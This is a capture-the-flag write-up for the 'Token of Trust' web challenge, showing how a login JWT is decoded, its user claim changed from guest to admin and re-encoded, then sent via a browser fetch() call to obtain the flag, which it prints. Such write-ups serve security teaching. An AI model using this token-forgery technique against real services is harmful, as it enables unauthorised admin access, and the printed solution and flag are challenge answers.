## Token of Trust

---

### Challenge

At first, this web app seems straightforward, but there’s something more lurking beneath the surface. It relies on a token for user authentication, but not everything is as secure as it seems. Look closely, and you might discover that the system’s trust can be manipulated.

The secret is hidden within the way this token is used. Can you find the key to unlock what’s been concealed? The challenge is waiting for you to crack it.

Submit your answer in the following format: ACECTF{3x4mpl3_fl4g}

[](http://34.131.133.224:9999/)

---

### Solution

As the webpage instructs us, we try to navigate to /login page, only to find that we need to send our requests with JSON payload `{"user":"ace","pass":"ctf"}` (the password is not verified so any random one will work). Also, the request has to be in POST form.

When we check the normal request to the website using [Burpsuit](https://portswigger.net/burp), we see that it is a GET request by default. We change the request to this:

```
POST /login HTTP/1.1
Host: 34.131.133.224:9999
Content-Type: application/json
Content-Length: 33
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: application/json
Connection: close

{"user":"ace","pass":"ctf"}
```

Upon forwarding this request, the token is printed on the website `{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}`

Since it is a jwt token, we can check the payload and algorithm using [jwt.io](https://jwt.io/). Using the jwt decoder, we get the payload and algorithm.

![jwt decoding](../attachments/TT1.png)

Since we find that the user is specified as `guest`, instead of `ace` (our input), we can modify the user to `admin` and craft a new token using the jwt encoder like this one:

admin token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.lo6cc_YVMrNFnffGek_avzLJ_mgkuvBsSz52NO3_6Kk`

Now that we have our token, we can pass it to the website using console. For that, we allow pasting in console and pass the following command:

```
fetch("http://34.131.133.224:9999/flag", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.lo6cc_YVMrNFnffGek_avzLJ_mgkuvBsSz52NO3_6Kk" })
}).then(response => response.text())
  .then(console.log);
```

This prints the flag in the console

---

### Flag

```
ACECTF{jwt_cr4ck3d_4dm1n_4cce55_0bt41n3d!}
